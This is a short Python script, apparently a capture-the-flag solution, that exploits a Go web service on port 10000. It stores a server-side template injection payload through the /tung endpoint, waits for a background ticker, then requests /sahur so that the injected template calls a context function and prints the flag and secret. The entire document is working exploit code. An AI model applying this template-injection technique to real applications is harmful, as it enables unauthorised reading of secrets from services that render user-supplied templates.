#!/usr/bin/env python3
import requests, time
import sys
ip = sys.argv[1]
target = "http://" + ip + ":10000/"
s = requests.Session()

# establish cookie/session
s.get(f"{target}/")

# store a row whose value is a Go template that will execute on /sahur
s.post(f"{target}/tung", data={
    "Tralalero": "k",  # any key
    "Tralala": '{{ $t := .Context.Value "tung" }}{{ call $t.Flag $t.Secret }}'
})

# optional extra row (not required)
s.post(f"{target}/tung", data={"Tralalero": "anything", "Tralala": "x"})

# wait for the 100ms ticker to move entries into 'sahurs'
time.sleep(0.3)

# render & print; the page should contain: "Flag is <FLAG>"
resp = s.get(f"{target}/sahur")
print(resp.text.encode(), flush=True)
